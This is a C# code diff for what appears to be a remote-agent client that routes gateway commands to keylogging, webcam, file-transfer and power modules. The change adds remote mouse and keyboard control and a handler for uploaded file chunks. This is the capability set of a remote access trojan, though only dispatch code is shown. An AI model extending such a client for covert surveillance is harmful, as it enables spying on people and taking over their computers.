@@ -31,7 +31,8 @@ namespace AgentSystem.Core
             { "keylog_start", "keylog" }, { "keylog_stop", "keylog" },
             { "fs_list", "file" }, { "fs_get", "file" }, { "fs_put", "file" },
             { "webcam_start", "webcam" }, { "webcam_stop", "webcam" },
-            { "power", "power" }
+            { "power", "power" },
+            { "input_mouse_move", "screen" }, { "input_mouse_click", "screen" }, { "input_key", "screen" }, { "input_type", "screen" }
         };
 
         public AgentClient(string agentId, string gatewayUrl, SecurityManager security, UIManager ui)
@@ -102,6 +103,14 @@ namespace AgentSystem.Core
         public void Stop() { /* Nội dung giữ nguyên */ wsClient.Disconnect(); }
         public void SendResponse(object responseData) { /* Nội dung giữ nguyên */ string json = JsonSerializer.Serialize(responseData); wsClient.SendText(json); }
         public void SendBinaryFrame(byte[] bytes) { /* Nội dung giữ nguyên */ wsClient.SendBinary(bytes); }
+
+        public void HandleBinaryFrame(byte[] bytes)
+        {
+            if (_moduleRegistry.TryGetValue("fs_put", out BaseModule mod) && mod is FileModule fileMod)
+            {
+                fileMod.HandleBinaryChunk(bytes);
+            }
+        }
 
         public void RouteCommand(CommandPacket packet)
         {
